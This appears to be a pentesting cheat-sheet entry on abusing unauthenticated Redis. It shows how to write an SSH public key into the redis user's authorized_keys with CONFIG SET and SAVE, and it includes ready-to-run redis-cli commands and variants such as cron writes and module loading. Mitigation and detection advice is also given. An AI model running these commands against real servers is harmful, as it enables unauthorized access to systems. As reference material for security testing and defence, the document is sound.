---
topic: Redis — authorized_keys write
tags: [linux, redis, ssh, file-write, privesc]
---

# Redis — authorized_keys write

**English** | [🌐 Español](redis-authorized-keys-write.md)

## Concept

Unauthenticated Redis allows `CONFIG SET dir` and `CONFIG SET dbfilename`. Saving the database into `.ssh/authorized_keys` places the public key among binary data; `sshd` ignores invalid lines and accepts the key.

## When it applies

- Redis answers without a password.
- The Redis user has a writable home and `.ssh`.
- `CONFIG` is not renamed or disabled.

## Procedure

1. Confirm `CONFIG GET dir` and permissions.
2. Set `dir` to `.ssh` and `dbfilename` to `authorized_keys`.
3. Insert the key with `-x` and run `SAVE`.
4. Log in over SSH as the Redis user.

## Commands

```bash
redis-cli -h <IP> config set dir /var/lib/redis/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
cat id_ed25519.pub | redis-cli -h <IP> -x set pwn
redis-cli -h <IP> save
ssh -i id_ed25519 redis@<IP>
```

## Variants

- Cron through `dir=/etc/cron.d`.
- Malicious module with `MODULE LOAD`.
- Master-slave replication for RCE.

## Limitations

- Redis runs without a home or in a container.
- `CONFIG` disabled.
- `authorized_keys` is read-only.

## Mitigation

- Require `requirepass` and ACLs.
- Do not expose Redis and keep `protected-mode`.
- Run Redis as a user without a shell or home.

## Detection

- Unexpected `CONFIG SET dir` or `dbfilename`.
- `SAVE` into `.ssh` or `/etc/cron.d`.
- New SSH logins as the Redis user.

## References

- [Redis — security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [0xdf — Postman](https://0xdf.gitlab.io/2020/03/14/htb-postman.html)
- [HackTricks — Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
